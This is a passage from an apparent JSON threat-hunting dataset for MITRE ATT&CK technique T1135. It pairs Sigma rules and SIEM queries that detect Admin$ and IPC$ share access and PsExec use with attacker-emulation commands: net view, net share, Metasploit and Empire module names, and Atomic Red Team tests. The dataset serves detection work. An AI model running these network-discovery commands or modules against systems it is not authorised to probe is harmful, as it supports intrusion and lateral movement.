Share\" must be configured for Success/Failure'\ndetection:\n    selection:\n        EventID: 5140\n        ShareName: Admin$\n    filter:\n        SubjectUserName: '*$'\n    condition: selection and not filter\nfalsepositives: \n    - Legitimate administrative activity\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"5140\" AND ShareName:\"Admin$\") AND (NOT (SubjectUserName.keyword:*$)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Access-to-ADMIN$-Share <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Access to ADMIN$ Share\",\\n    \"description\": \"Detects access to $ADMIN share\",\\n    \"tags\": [\\n      \"attack.lateral_movement\",\\n      \"attack.t1077\"\\n    ],\\n    \"query\": \"((EventID:\\\\\"5140\\\\\" AND ShareName:\\\\\"Admin$\\\\\") AND (NOT (SubjectUserName.keyword:*$)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"5140\\\\\" AND ShareName:\\\\\"Admin$\\\\\") AND (NOT (SubjectUserName.keyword:*$)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Access to ADMIN$ Share\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"5140\" AND ShareName:\"Admin$\") AND (NOT (SubjectUserName.keyword:*$)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"5140\" ShareName=\"Admin$\") NOT (SubjectUserName=\"*$\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" (event_id=\"5140\" ShareName=\"Admin$\")  -(SubjectUserName=\"*$\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*5140)(?=.*Admin\\\\$)))(?=.*(?!.*(?:.*(?=.*.*\\\\$)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: First time seen remote named pipe\nid: 52d8b0c6-53d6-439a-9e41-52ad442ad9ad\ndescription: This detection excludes known namped pipes accessible remotely and notify on newly observed ones, may help to detect lateral movement and remote exec\n    using named pipes\nauthor: Samir Bousseaden\nreferences:\n    - https://twitter.com/menasec1/status/1104489274387451904\ntags:\n    - attack.lateral_movement\n    - attack.t1077\nlogsource:\n    product: windows\n    service: security\n    description: 'The advanced audit policy setting \"Object Access > Audit Detailed File Share\" must be configured for Success/Failure'\ndetection:\n    selection1:\n        EventID: 5145\n        ShareName: \\\\*\\IPC$\n    selection2:\n        EventID: 5145\n        ShareName: \\\\*\\IPC$\n        RelativeTargetName:\n         - 'atsvc'\n         - 'samr'\n         - 'lsarpc'\n         - 'winreg'\n         - 'netlogon'\n         - 'srvsvc'\n         - 'protected_storage'\n         - 'wkssvc'\n         - 'browser'\n         - 'netdfs'\n    condition: selection1 and not selection2\nfalsepositives: \n    - update the excluded named pipe to filter out any newly observed legit named pipe\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: First time seen remote named pipe\nid: 52d8b0c6-53d6-439a-9e41-52ad442ad9ad\ndescription: This detection excludes known namped pipes accessible remotely and notify on newly observed ones, may help to detect lateral movement and remote exec\n    using named pipes\nauthor: Samir Bousseaden\nreferences:\n    - https://twitter.com/menasec1/status/1104489274387451904\ntags:\n    - attack.lateral_movement\n    - attack.t1077\nlogsource:\n    product: windows\n    service: security\n    description: 'The advanced audit policy setting \"Object Access > Audit Detailed File Share\" must be configured for Success/Failure'\ndetection:\n    selection1:\n        EventID: 5145\n        ShareName: \\\\*\\IPC$\n    selection2:\n        EventID: 5145\n        ShareName: \\\\*\\IPC$\n        RelativeTargetName:\n         - 'atsvc'\n         - 'samr'\n         - 'lsarpc'\n         - 'winreg'\n         - 'netlogon'\n         - 'srvsvc'\n         - 'protected_storage'\n         - 'wkssvc'\n         - 'browser'\n         - 'netdfs'\n    condition: selection1 and not selection2\nfalsepositives: \n    - update the excluded named pipe to filter out any newly observed legit named pipe\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"5145\" AND ShareName.keyword:\\\\\\\\*\\\\\\\\IPC$) AND (NOT (EventID:\"5145\" AND ShareName.keyword:\\\\\\\\*\\\\\\\\IPC$ AND RelativeTargetName:(\"atsvc\" OR \"samr\" OR \"lsarpc\" OR \"winreg\" OR \"netlogon\" OR \"srvsvc\" OR \"protected_storage\" OR \"wkssvc\" OR \"browser\" OR \"netdfs\"))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/First-time-seen-remote-named-pipe <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"First time seen remote named pipe\",\\n    \"description\": \"This detection excludes known namped pipes accessible remotely and notify on newly observed ones, may help to detect lateral movement and remote exec using named pipes\",\\n    \"tags\": [\\n      \"attack.lateral_movement\",\\n      \"attack.t1077\"\\n    ],\\n    \"query\": \"((EventID:\\\\\"5145\\\\\" AND ShareName.keyword:\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\IPC$) AND (NOT (EventID:\\\\\"5145\\\\\" AND ShareName.keyword:\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\IPC$ AND RelativeTargetName:(\\\\\"atsvc\\\\\" OR \\\\\"samr\\\\\" OR \\\\\"lsarpc\\\\\" OR \\\\\"winreg\\\\\" OR \\\\\"netlogon\\\\\" OR \\\\\"srvsvc\\\\\" OR \\\\\"protected_storage\\\\\" OR \\\\\"wkssvc\\\\\" OR \\\\\"browser\\\\\" OR \\\\\"netdfs\\\\\"))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"5145\\\\\" AND ShareName.keyword:\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\IPC$) AND (NOT (EventID:\\\\\"5145\\\\\" AND ShareName.keyword:\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\IPC$ AND RelativeTargetName:(\\\\\"atsvc\\\\\" OR \\\\\"samr\\\\\" OR \\\\\"lsarpc\\\\\" OR \\\\\"winreg\\\\\" OR \\\\\"netlogon\\\\\" OR \\\\\"srvsvc\\\\\" OR \\\\\"protected_storage\\\\\" OR \\\\\"wkssvc\\\\\" OR \\\\\"browser\\\\\" OR \\\\\"netdfs\\\\\"))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'First time seen remote named pipe\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"5145\" AND ShareName.keyword:\\\\\\\\*\\\\\\\\IPC$) AND (NOT (EventID:\"5145\" AND ShareName.keyword:\\\\\\\\*\\\\\\\\IPC$ AND RelativeTargetName:(\"atsvc\" \"samr\" \"lsarpc\" \"winreg\" \"netlogon\" \"srvsvc\" \"protected_storage\" \"wkssvc\" \"browser\" \"netdfs\"))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"5145\" ShareName=\"\\\\\\\\*\\\\\\\\IPC$\") NOT (EventID=\"5145\" ShareName=\"\\\\\\\\*\\\\\\\\IPC$\" (RelativeTargetName=\"atsvc\" OR RelativeTargetName=\"samr\" OR RelativeTargetName=\"lsarpc\" OR RelativeTargetName=\"winreg\" OR RelativeTargetName=\"netlogon\" OR RelativeTargetName=\"srvsvc\" OR RelativeTargetName=\"protected_storage\" OR RelativeTargetName=\"wkssvc\" OR RelativeTargetName=\"browser\" OR RelativeTargetName=\"netdfs\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" (event_id=\"5145\" ShareName=\"\\\\\\\\*\\\\\\\\IPC$\")  -(event_id=\"5145\" ShareName=\"\\\\\\\\*\\\\\\\\IPC$\" RelativeTargetName IN [\"atsvc\", \"samr\", \"lsarpc\", \"winreg\", \"netlogon\", \"srvsvc\", \"protected_storage\", \"wkssvc\", \"browser\", \"netdfs\"]))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*5145)(?=.*\\\\\\\\.*\\\\IPC\\\\$)))(?=.*(?!.*(?:.*(?=.*5145)(?=.*\\\\\\\\.*\\\\IPC\\\\$)(?=.*(?:.*atsvc|.*samr|.*lsarpc|.*winreg|.*netlogon|.*srvsvc|.*protected_storage|.*wkssvc|.*browser|.*netdfs))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious PsExec execution\nid: c462f537-a1e3-41a6-b5fc-b2c2cef9bf82\ndescription: detects execution of psexec or paexec with renamed service name, this rule helps to filter out the noise if psexec is used for legit purposes or if attacker\n    uses a different psexec client other than sysinternal one\nauthor: Samir Bousseaden\nreferences:\n    - https://blog.menasec.net/2019/02/threat-hunting-3-detecting-psexec.html\ntags:\n    - attack.lateral_movement\n    - attack.t1077\nlogsource:\n    product: windows\n    service: security\n    description: 'The advanced audit policy setting \"Object Access > Audit Detailed File Share\" must be configured for Success/Failure'\ndetection:\n    selection1:\n        EventID: 5145\n        ShareName: \\\\*\\IPC$\n        RelativeTargetName:\n         - '*-stdin'\n         - '*-stdout'\n         - '*-stderr'\n    selection2:\n        EventID: 5145\n        ShareName: \\\\*\\IPC$\n        RelativeTargetName: 'PSEXESVC*'\n    condition: selection1 and not selection2\nfalsepositives: \n    - nothing observed so far\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious PsExec execution\nid: c462f537-a1e3-41a6-b5fc-b2c2cef9bf82\ndescription: detects execution of psexec or paexec with renamed service name, this rule helps to filter out the noise if psexec is used for legit purposes or if attacker\n    uses a different psexec client other than sysinternal one\nauthor: Samir Bousseaden\nreferences:\n    - https://blog.menasec.net/2019/02/threat-hunting-3-detecting-psexec.html\ntags:\n    - attack.lateral_movement\n    - attack.t1077\nlogsource:\n    product: windows\n    service: security\n    description: 'The advanced audit policy setting \"Object Access > Audit Detailed File Share\" must be configured for Success/Failure'\ndetection:\n    selection1:\n        EventID: 5145\n        ShareName: \\\\*\\IPC$\n        RelativeTargetName:\n         - '*-stdin'\n         - '*-stdout'\n         - '*-stderr'\n    selection2:\n        EventID: 5145\n        ShareName: \\\\*\\IPC$\n        RelativeTargetName: 'PSEXESVC*'\n    condition: selection1 and not selection2\nfalsepositives: \n    - nothing observed so far\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"5145\" AND ShareName.keyword:\\\\\\\\*\\\\\\\\IPC$ AND RelativeTargetName.keyword:(*\\\\-stdin OR *\\\\-stdout OR *\\\\-stderr)) AND (NOT (EventID:\"5145\" AND ShareName.keyword:\\\\\\\\*\\\\\\\\IPC$ AND RelativeTargetName.keyword:PSEXESVC*)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-PsExec-execution <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious PsExec execution\",\\n    \"description\": \"detects execution of psexec or paexec with renamed service name, this rule helps to filter out the noise if psexec is used for legit purposes or if attacker uses a different psexec client other than sysinternal one\",\\n    \"tags\": [\\n      \"attack.lateral_movement\",\\n      \"attack.t1077\"\\n    ],\\n    \"query\": \"((EventID:\\\\\"5145\\\\\" AND ShareName.keyword:\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\IPC$ AND RelativeTargetName.keyword:(*\\\\\\\\-stdin OR *\\\\\\\\-stdout OR *\\\\\\\\-stderr)) AND (NOT (EventID:\\\\\"5145\\\\\" AND ShareName.keyword:\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\IPC$ AND RelativeTargetName.keyword:PSEXESVC*)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"5145\\\\\" AND ShareName.keyword:\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\IPC$ AND RelativeTargetName.keyword:(*\\\\\\\\-stdin OR *\\\\\\\\-stdout OR *\\\\\\\\-stderr)) AND (NOT (EventID:\\\\\"5145\\\\\" AND ShareName.keyword:\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\IPC$ AND RelativeTargetName.keyword:PSEXESVC*)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious PsExec execution\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"5145\" AND ShareName.keyword:\\\\\\\\*\\\\\\\\IPC$ AND RelativeTargetName.keyword:(*\\\\-stdin *\\\\-stdout *\\\\-stderr)) AND (NOT (EventID:\"5145\" AND ShareName.keyword:\\\\\\\\*\\\\\\\\IPC$ AND RelativeTargetName.keyword:PSEXESVC*)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"5145\" ShareName=\"\\\\\\\\*\\\\\\\\IPC$\" (RelativeTargetName=\"*-stdin\" OR RelativeTargetName=\"*-stdout\" OR RelativeTargetName=\"*-stderr\")) NOT (EventID=\"5145\" ShareName=\"\\\\\\\\*\\\\\\\\IPC$\" RelativeTargetName=\"PSEXESVC*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" (event_id=\"5145\" ShareName=\"\\\\\\\\*\\\\\\\\IPC$\" RelativeTargetName IN [\"*-stdin\", \"*-stdout\", \"*-stderr\"])  -(event_id=\"5145\" ShareName=\"\\\\\\\\*\\\\\\\\IPC$\" RelativeTargetName=\"PSEXESVC*\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*5145)(?=.*\\\\\\\\.*\\\\IPC\\\\$)(?=.*(?:.*.*-stdin|.*.*-stdout|.*.*-stderr))))(?=.*(?!.*(?:.*(?=.*5145)(?=.*\\\\\\\\.*\\\\IPC\\\\$)(?=.*PSEXESVC.*)))))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "net share", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "net share", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "auxiliary/scanner/smb/smb_enumshares", "name": "Metasploit"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "net view \\\\host /all [/domain:domain]", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "net view \\\\host /domain", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "auxiliary/scanner/smb/smb_enumshares", "name": "Metasploit"}, {"source": "atomics/T1135/T1135.yaml", "command": "df -aH\nsmbutil view -g //computer1\nshowmount computer1\n", "name": null}, {"source": "atomics/T1135/T1135.yaml", "command": "net view \\\\localhost\n", "name": null}, {"source": "atomics/T1135/T1135.yaml", "command": "net view \\\\localhost\nget-smbshare -Name localhost\n", "name": null}, {"source": "atomics/T1135/T1135.yaml", "command": "net share\n", "name": null}, {"source": "data/abilities/discovery/530e47c6-8592-42bf-91df-c59ffbd8541b.yml", "command": {"windows": {"pwsh,psh": {"parsers": {"plugins.stockpile.app.parsers.json": [{"source": "domain.smb.share", "json_key": "Path", "json_type": ["str"]}]}, "command": "Get-SmbShare | ConvertTo-Json"}}}, "name": "Network Share Discovery"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_dfs_share", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_dfs_share", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/share_finder", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/share_finder", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_fileservers", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_fileservers", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/smb_mount", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/smb_mount", "name": "Empire Module Command"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\nC: \\ Windows \\ system32> net view \\\\ OWA2010SP3.0day.org\nIn the shared resource \\\\ OWA2010SP3.0day.org\n\n\n\nShare name for the type of use annotations\n\n-------------------------------------------------- -----------------------------\nAddress Disk \"Access to address objects\"\nCertEnroll Disk Active Directory Certificate Services Share\nExchangeOAB Disk OAB Distribution share\nGroupMetrics Disk group metrics MailTips publishing point\nNETLOGON Disk Logon server share\nSYSVOL Disk Logon server share\nThe command completed successfully.", "name": "Dos"}], "command_list": ["net share", "net share", "auxiliary/scanner/smb/smb_enumshares", "net view \\\\host /all [/domain:domain]", "net view \\\\host /domain", "auxiliary/scanner/smb/smb_enumshares", "df -aH\nsmbutil view -g //computer1\nshowmount computer1\n", "net view \\\\localhost\n", "net view \\\\localhost\nget-smbshare -Name localhost\n", "net share\n", {"windows": {"pwsh,psh": {"parsers": {"plugins.stockpile.app.parsers.json": [{"source": "domain.smb.share", "json_key": "Path", "json_type": ["str"]}]}, "command": "Get-SmbShare | ConvertTo-Json"}}}, "powershell/situational_awareness/network/powerview/get_dfs_share", "powershell/situational_awareness/network/powerview/get_dfs_share", "powershell/situational_awareness/network/powerview/share_finder", "powershell/situational_awareness/network/powerview/share_finder", "python/situational_awareness/network/active_directory/get_fileservers", "python/situational_awareness/network/active_directory/get_fileservers", "python/situational_awareness/network/smb_mount", "python/situational_awareness/network/smb_mount", "Dos\nC: \\ Windows \\ system32> net view \\\\ OWA2010SP3.0day.org\nIn the shared resource \\\\ OWA2010SP3.0day.org\n\n\n\nShare name for the type of use annotations\n\n-------------------------------------------------- -----------------------------\nAddress Disk \"Access to address objects\"\nCertEnroll Disk Active Directory Certificate Services Share\nExchangeOAB Disk OAB Distribution share\nGroupMetrics Disk group metrics MailTips publishing point\nNETLOGON Disk Logon server share\nSYSVOL Disk Logon server share\nThe command completed successfully."], "technique_id": "T1135", "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1135", "Built-in Windows Command": "net share", "Cobalt Strike": "net share", "Description": "Used to view network shared resource information, share a new network resource, and remove an old shared network resource from the workstation. Not for remote queries", "Metasploit": "auxiliary/scanner/smb/smb_enumshares"}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1135", "Built-in Windows Command": "net view \\\\host /all [/domain:domain]", "Cobalt Strike": "net view \\\\host /domain", "Description": "Display the list of workstations and network devices on the network. ", "Metasploit": "auxiliary/scanner/smb/smb_enumshares"}}, {"Atomic Red Team Test - Network Share Discovery": {"display_name": "Network Share Discovery", "atomic_tests": [{"description": "Network Share Discovery\n", "supported_platforms": ["macos", "linux"], "name": "Network Share Discovery", "input_arguments": {"computer_name": {"default": "computer1", "type": "string", "description": "Computer name to find a mount on."}}, "executor": {"command": "df -aH\nsmbutil view -g //#{computer_name}\nshowmount #{computer_name}\n", "name": "sh"}}, {"description": "Network Share Discovery utilizing the command prompt\n", "supported_platforms": ["windows"], "name": "Network Share Discovery command prompt", "input_arguments": {"computer_name": {"default": "localhost", "type": "string", "description": "Computer name to find a mount on."}}, "executor": {"elevation_required": false, "command": "net view \\\\#{computer_name}\n", "name": "command_prompt"}}, {"description": "Network Share Discovery utilizing PowerShell\n", "supported_platforms": ["windows"], "name": "Network Share Discovery PowerShell", "input_arguments": {"computer_name": {"default": "localhost", "type": "string", "description": "Computer name to find a mount on."}}, "executor": {"elevation_required": false, "command": "net view \\\\#{computer_name}\nget-smbshare -Name #{computer_name}\n", "name": "powershell"}}, {"description": "View information about all of the resources that are shared on the local computer", "supported_platforms": ["windows"], "name": "View available share drives", "executor": {"elevation_required": false, "command": "net share\n", "name": "command_prompt"}}], "attack_technique": "T1135"}}, {"Mitre Stockpile - Network Share Discovery": {"platforms": {"windows": {"pwsh,psh": {"parsers": {"plugins.stockpile.app.parsers.json": [{"source": "domain.smb.share", "json_key": "Path", "json_type": ["str"]}]}, "command": "Get-SmbShare | ConvertTo-Json"}}}, "description": "Network Share Discovery", "tactic": "discovery", "technique": {"attack_id": "T1135", "name": "Network Share Discovery"}, "id": "530e47c6-8592-42bf-91df-c59ffbd8541b", "name": "View admin shares"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1135", "Empire Module": "powershell/situational_awareness/network/powerview/get_dfs_share", "Technique": "Network Share Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_dfs_share\":  [\"T1135\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1135", "Empire Module": "powershell/situational_awareness/network/powerview/share_finder", "Technique": "Network Share Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/share_finder\":  [\"T1135\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1135", "Empire Module": "python/situational_awareness/network/active_directory/get_fileservers", "Technique": "Network Share Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/active_directory/get_fileservers\":  [\"T1135\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1135", "Empire Module": "python/situational_awareness/network/smb_mount", "Technique": "Network Share Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/smb_mount\":  [\"T1135\"],"}}], "queries": [{"query": "Sysmon| where process_path contains \"net.exe\"and (process_command_line contains \"view\"or process_command_line contains \"share\")", "product": "Azure Sentinel", "name": "Network Share Discovery"}, {"query": "Sysmon| where EventID == 1 and (process_path contains \"net.exe\"and (process_command_line contains \"net view\"or process_command_line contains \"net share\"))or process_command_line contains \"get-smbshare -Name\"", "product": "Azure Sentinel", "name": "Network Share Discovery Process"}, {"query": "title: Net.exe Execution\nid: 183e7ea8-ac4b-4c23-9aec-b3dac4e401ac\nstatus: experimental\ndescription: Detects execution of Net.exe, whether suspicious or benign.\nreferences:\n    - https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/\n    - https://eqllib.readthedocs.io/en/latest/analytics/4d2e7fc1-af0b-4915-89aa-03d25ba7805e.html\n    - https://eqllib.readthedocs.io/en/latest/analytics/e61f557c-a9d0-4c25-ab5b-bbc46bb24deb.html\n    - https://eqllib.readthedocs.io/en/latest/analytics/9b3dd402-891c-4c4d-a662-28947168ce61.html\nauthor: Michael Haag, Mark Woan (improvements), James Pemberton / @4A616D6573 / oscd.community (improvements)\ntags:\n    - attack.s0039\n    - attack.t1027\n    - attack.t1049\n    - attack.t1077\n    - attack.t1135\n    - attack.lateral_movement\n    - attack.discovery\n    - attack.defense_evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image:\n            - '*\\net.exe'\n            - '*\\net1.exe'\n    cmdline:\n        CommandLine:\n            - '* group*'\n            - '* localgroup*'\n            - '* user*'\n            - '* view*'\n            - '* share'\n            - '* accounts*'\n            - '* use*'\n            - '* stop *'\n    condition: selection and cmdline\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Will need to be tuned. If using Splunk, I recommend | stats count by Computer,CommandLine following the search for easy hunting by computer/CommandLine.\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Net.exe Execution\nid: 183e7ea8-ac4b-4c23-9aec-b3dac4e401ac\nstatus: experimental\ndescription: Detects execution of Net.exe, whether suspicious or benign.\nreferences:\n    - https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/\n    - https://eqllib.readthedocs.io/en/latest/analytics/4d2e7fc1-af0b-4915-89aa-03d25ba7805e.html\n    - https://eqllib.readthedocs.io/en/latest/analytics/e61f557c-a9d0-4c25-ab5b-bbc46bb24deb.html\n    - https://eqllib.readthedocs.io/en/latest/analytics/9b3dd402-891c-4c4d-a662-28947168ce61.html\nauthor: Michael Haag, Mark Woan (improvements), James Pemberton / @4A616D6573 / oscd.community (improvements)\ntags:\n    - attack.s0039\n    - attack.t1027\n    - attack.t1049\n    - attack.t1077\n    - attack.t1135\n    - attack.lateral_movement\n    - attack.discovery\n    - attack.defense_evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image:\n            - '*\\net.exe'\n            - '*\\net1.exe'\n    cmdline:\n        CommandLine:\n            - '* group*'\n            - '* localgroup*'\n            - '* user*'\n            - '* view*'\n            - '* share'\n            - '* accounts*'\n            - '* use*'\n            - '* stop *'\n    condition: selection and cmdline\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Will need to be tuned. If using Splunk, I recommend | stats count by Computer,CommandLine following the search for easy hunting by computer/CommandLine.\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:(*\\\\\\\\net.exe OR *\\\\\\\\net1.exe) AND CommandLine.keyword:(*\\\\ group* OR *\\\\ localgroup* OR *\\\\ user* OR *\\\\ view* OR *\\\\ share OR *\\\\ accounts* OR *\\\\ use* OR *\\\\ stop\\\\ *))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary 